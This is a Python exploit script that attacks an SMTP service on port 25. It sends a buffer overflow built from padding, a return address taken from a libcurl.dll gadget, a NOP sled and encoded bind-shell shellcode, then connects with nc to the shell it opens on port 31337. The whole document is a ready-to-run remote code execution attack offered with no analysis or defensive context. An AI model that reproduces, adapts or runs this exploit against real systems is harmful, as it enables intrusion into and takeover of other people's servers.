

#!/usr/bin/python

from socket import *
import time,os,sys

s = socket(AF_INET,SOCK_STREAM)

if len(sys.argv) < 2:
	print "Usage: %s <ip>" %sys.argv[0]
	sys.exit()

host = sys.argv[1]

# bind to port 31337
# encoded with shikata_ga_nai
bind = ("\xd9\xc3\xba\xa7\x4e\x69\x4d\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x56\x83\xe8\xfc\x31\x50\x14\x03\x50\xb3\xac\x9c\xb1\x53\xb9"
"\x5f\x4a\xa3\xda\xd6\xaf\x92\xc8\x8d\xa4\x86\xdc\xc6\xe9\x2a"
"\x96\x8b\x19\xb9\xda\x03\x2d\x0a\x50\x72\x00\x8b\x54\xba\xce"
"\x4f\xf6\x46\x0d\x83\xd8\x77\xde\xd6\x19\xbf\x03\x18\x4b\x68"
"\x4f\x8a\x7c\x1d\x0d\x16\x7c\xf1\x19\x26\x06\x74\xdd\xd2\xbc"
"\x77\x0e\x4a\xca\x30\xb6\xe1\x94\xe0\xc7\x26\xc7\xdd\x8e\x43"
"\x3c\x95\x10\x85\x0c\x56\x23\xe9\xc3\x69\x8b\xe4\x1a\xad\x2c"
"\x16\x69\xc5\x4e\xab\x6a\x1e\x2c\x77\xfe\x83\x96\xfc\x58\x60"
"\x26\xd1\x3f\xe3\x24\x9e\x34\xab\x28\x21\x98\xc7\x55\xaa\x1f"
"\x08\xdc\xe8\x3b\x8c\x84\xab\x22\x95\x60\x1a\x5a\xc5\xcd\xc3"
"\xfe\x8d\xfc\x10\x78\xcc\x68\xd5\xb7\xef\x68\x71\xcf\x9c\x5a"
"\xde\x7b\x0b\xd7\x97\xa5\xcc\x18\x82\x12\x42\xe7\x2c\x63\x4a"
"\x2c\x78\x33\xe4\x85\x00\xd8\xf4\x2a\xd5\x4f\xa5\x84\x85\x2f"
"\x15\x65\x75\xd8\x7f\x6a\xaa\xf8\x7f\xa0\xdd\x3e\x4e\x90\x8e"
"\xa8\xb3\x26\x4a\x40\x3d\xc0\xc0\x82\x6b\x5a\x7c\x61\x48\x53"
"\x1b\x9a\xba\xcf\xb4\x0c\xf2\x19\x02\x32\x03\x0c\x21\x9f\xab"
"\xc7\xb1\xf3\x6f\xf9\xc6\xd9\xc7\x70\xff\x8a\x92\xec\xb2\x2b"
"\xa2\x24\x24\xcf\x31\xa3\xb4\x86\x29\x7c\xe3\xcf\x9c\x75\x61"
"\xe2\x87\x2f\x97\xff\x5e\x17\x13\x24\xa3\x96\x9a\xa9\x9f\xbc"
"\x8c\x77\x1f\xf9\xf8\x27\x76\x57\x56\x8e\x20\x19\x00\x58\x9e"
"\xf3\xc4\x1d\xec\xc3\x92\x21\x39\xb2\x7a\x93\x94\x83\x85\x1c"
"\x71\x04\xfe\x40\xe1\xeb\xd5\xc0\x11\xa6\x77\x60\xba\x6f\xe2"
"\x30\xa7\x8f\xd9\x77\xde\x13\xeb\x07\x25\x0b\x9e\x02\x61\x8b"
"\x73\x7f\xfa\x7e\x73\x2c\xfb\xaa")


buf = "A" * 503
buf += "\x3a\x01\x02\x10"		# 0x1002013a call ebx from libcurl.dll
buf += "\x90" * 8
buf += bind
buf += "\xcc" * 100

print "[*] Sending evil buffer..."
s.connect((host,25))
s.recv(1024)
s.send('EHLO zombi3@de.org' +'\r\n')
s.recv(1024)
s.send(buf)
s.close()
print "[*] Payload sent.."
print "[*] Waiting for a shell.."
time.sleep(2)
os.system("nc %s 31337"%sys.argv[1])
